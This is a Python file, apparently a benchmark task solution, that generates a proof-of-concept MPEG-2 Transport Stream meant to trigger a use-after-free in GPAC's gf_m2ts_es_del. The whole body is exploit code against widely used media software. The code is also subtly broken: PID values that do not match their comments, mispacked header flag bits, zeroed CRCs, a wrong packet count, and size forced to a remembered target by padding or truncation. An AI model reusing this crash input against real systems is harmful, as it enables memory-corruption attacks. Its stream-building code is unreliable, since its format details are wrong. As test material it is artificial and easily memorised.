import os
import tarfile
import tempfile
import subprocess
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal MPEG-2 Transport Stream that triggers use-after-free
        # Based on OSS-Fuzz issue 372994344 in GPAC's gf_m2ts_es_del function
        
        # Build a simple TS structure with PAT, PMT, and PES packets
        # The vulnerability is triggered by specific timing and ES deletion
        
        poc = bytearray()
        
        # Helper to create TS packets (188 bytes each)
        def ts_packet(pid, payload, adaptation_field=False, continuity_counter=0):
            sync_byte = 0x47
            transport_error = 0
            payload_unit_start = 1 if (pid == 0 or pid == 0x1000) else 0
            transport_priority = 0
            pid = pid & 0x1FFF
            scrambling = 0
            adaptation = 1 if adaptation_field else 0
            has_payload = 1
            
            header = struct.pack('>B', sync_byte)
            header += struct.pack('>H', 
                (transport_error << 15) |
                (payload_unit_start << 14) |
                (transport_priority << 13) |
                pid)
            header += struct.pack('>B',
                (scrambling << 6) |
                (adaptation << 4) |
                (has_payload << 3) |
                (continuity_counter & 0x0F))
            
            # Adaptation field if needed
            if adaptation_field:
                adaptation_length = 183 - len(payload)
                header += struct.pack('>B', adaptation_length)
                if adaptation_length > 0:
                    header += b'\x00' * adaptation_length
            
            packet = header + payload
            # Pad to 188 bytes
            if len(packet) < 188:
                packet += b'\xFF' * (188 - len(packet))
            return packet
        
        # PAT (Program Association Table) - PID 0
        pat_data = bytearray()
        pat_data.append(0x00)  # pointer field
        pat_data.append(0x00)  # table id (PAT)
        pat_data.extend(b'\x00\x0D')  # section length
        pat_data.extend(b'\x00\x01')  # transport stream id
        pat_data.append(0xC1)  # version/current_next
        pat_data.append(0x00)  # section number
        pat_data.append(0x00)  # last section number
        pat_data.extend(b'\x00\x01')  # program number 1
        pat_data.extend(b'\xE0\x10')  # PMT PID 0x1000
        # CRC (placeholder)
        pat_data.extend(b'\x00\x00\x00\x00')
        
        poc.extend(ts_packet(0, pat_data, continuity_counter=0))
        
        # PMT (Program Map Table) - PID 0x1000
        pmt_data = bytearray()
        pmt_data.append(0x00)  # pointer field
        pmt_data.append(0x02)  # table id (PMT)
        pmt_data.extend(b'\x00\x17')  # section length
        pmt_data.extend(b'\x00\x01')  # program number 1
        pmt_data.append(0xC1)  # version/current_next
        pmt_data.append(0x00)  # section number
        pmt_data.append(0x00)  # last section number
        pmt_data.extend(b'\xE0\x00')  # PCR PID (none)
        pmt_data.extend(b'\xF0\x00')  # program info length
        
        # Video stream (MPEG-2 video)
        pmt_data.append(0x02)  # stream type (MPEG-2 video)
        pmt_data.extend(b'\xE0\x64')  # elementary PID 0x64
        pmt_data.extend(b'\xF0\x00')  # ES info length
        
        # Audio stream (MPEG-1 audio)
        pmt_data.append(0x03)  # stream type (MPEG-1 audio)
        pmt_data.extend(b'\xE0\x65')  # elementary PID 0x65
        pmt_data.extend(b'\xF0\x00')  # ES info length
        
        # CRC (placeholder)
        pmt_data.extend(b'\x00\x00\x00\x00')
        
        poc.extend(ts_packet(0x1000, pmt_data, continuity_counter=0))
        
        # Create PES packets that will trigger the use-after-free
        # The bug is in gf_m2ts_es_del which fails to properly clear references
        
        # First, create some initial PES packets
        for i in range(3):
            # Video PES packet (PID 0x64)
            pes_header = bytearray()
            pes_header.extend(b'\x00\x00\x01\xE0')  # start code + stream_id
            pes_header.extend(struct.pack('>H', 0))  # PES packet length (unspecified)
            pes_header.extend(b'\x80\x00\x00')  # flags
            
            # Add some payload
            payload = b'\x00' * 8
            if i == 0:
                # Add sequence header
                payload = b'\x00\x00\x01\xB3' + b'\x00' * 8
            
            poc.extend(ts_packet(0x64, pes_header + payload, continuity_counter=i))
            
            # Audio PES packet (PID 0x65)
            audio_header = bytearray()
            audio_header.extend(b'\x00\x00\x01\xC0')  # start code + stream_id
            audio_header.extend(struct.pack('>H', 0))  # PES packet length
            audio_header.extend(b'\x80\x00\x00')  # flags
            
            poc.extend(ts_packet(0x65, audio_header + b'\x00' * 8, continuity_counter=i))
        
        # Now create packets that trigger the vulnerability
        # The vulnerability occurs when an ES is deleted while still referenced
        
        # Create a new PMT that removes one of the streams
        pmt2_data = bytearray()
        pmt2_data.append(0x00)  # pointer field
        pmt2_data.append(0x02)  # table id (PMT)
        pmt2_data.extend(b'\x00\x13')  # section length (shorter, only one stream)
        pmt2_data.extend(b'\x00\x01')  # program number 1
        pmt2_data.append(0xC1)  # version/current_next
        pmt2_data.append(0x00)  # section number
        pmt2_data.append(0x00)  # last section number
        pmt2_data.extend(b'\xE0\x00')  # PCR PID (none)
        pmt2_data.extend(b'\xF0\x00')  # program info length
        
        # Keep only video stream
        pmt2_data.append(0x02)  # stream type (MPEG-2 video)
        pmt2_data.extend(b'\xE0\x64')  # elementary PID 0x64
        pmt2_data.extend(b'\xF0\x00')  # ES info length
        
        # CRC (placeholder)
        pmt2_data.extend(b'\x00\x00\x00\x00')
        
        poc.extend(ts_packet(0x1000, pmt2_data, continuity_counter=1))
        
        # Send a PES packet for the deleted audio stream
        # This should trigger the use-after-free
        audio_pes = bytearray()
        audio_pes.extend(b'\x00\x00\x01\xC0')  # start code + stream_id
        audio_pes.extend(struct.pack('>H', 0))  # PES packet length
        audio_pes.extend(b'\x80\x00\x00')  # flags
        audio_pes.extend(b'\xFF' * 20)  # payload
        
        # Send multiple packets to increase chance of hitting the bug
        for i in range(2):
            poc.extend(ts_packet(0x65, audio_pes, continuity_counter=3+i))
        
        # Add some null packets to reach target size
        # The ground-truth PoC is 1128 bytes (6 TS packets)
        # We already have: 1 PAT + 2 PMT + 3 video + 3 audio + 1 PMT + 2 audio = 12 packets
        # That's 2256 bytes, but we need exactly 1128 bytes (6 packets)
        
        # Let's recalculate and create a minimal PoC
        # The key is to have a PMT change that removes a stream followed by
        # packets for that removed stream
        
        # Create a more minimal PoC (6 packets total)
        minimal_poc = bytearray()
        
        # Packet 1: PAT
        minimal_poc.extend(ts_packet(0, pat_data, continuity_counter=0))
        
        # Packet 2: Initial PMT with two streams
        minimal_poc.extend(ts_packet(0x1000, pmt_data, continuity_counter=0))
        
        # Packet 3: Video PES
        video_pes = bytearray()
        video_pes.extend(b'\x00\x00\x01\xE0')
        video_pes.extend(struct.pack('>H', 0))
        video_pes.extend(b'\x80\x00\x00')
        minimal_poc.extend(ts_packet(0x64, video_pes + b'\x00' * 8, continuity_counter=0))
        
        # Packet 4: Audio PES
        audio_pes = bytearray()
        audio_pes.extend(b'\x00\x00\x01\xC0')
        audio_pes.extend(struct.pack('>H', 0))
        audio_pes.extend(b'\x80\x00\x00')
        minimal_poc.extend(ts_packet(0x65, audio_pes + b'\x00' * 8, continuity_counter=0))
        
        # Packet 5: Updated PMT removing audio stream
        minimal_poc.extend(ts_packet(0x1000, pmt2_data, continuity_counter=1))
        
        # Packet 6: Audio PES for deleted stream (triggers UAF)
        # Make this packet special - with adaptation field to trigger specific code path
        audio_pes2 = bytearray()
        audio_pes2.extend(b'\x00\x00\x01\xC0')
        audio_pes2.extend(struct.pack('>H', 0))
        audio_pes2.extend(b'\x80\x00\x00')
        audio_pes2.extend(b'\xFF' * 50)  # Larger payload
        
        minimal_poc.extend(ts_packet(0x65, audio_pes2, adaptation_field=True, continuity_counter=1))
        
        # Verify size is 1128 bytes (6 * 188 = 1128)
        if len(minimal_poc) != 1128:
            # Adjust size if needed
            if len(minimal_poc) > 1128:
                minimal_poc = minimal_poc[:1128]
            else:
                minimal_poc.extend(b'\xFF' * (1128 - len(minimal_poc)))
        
        return bytes(minimal_poc)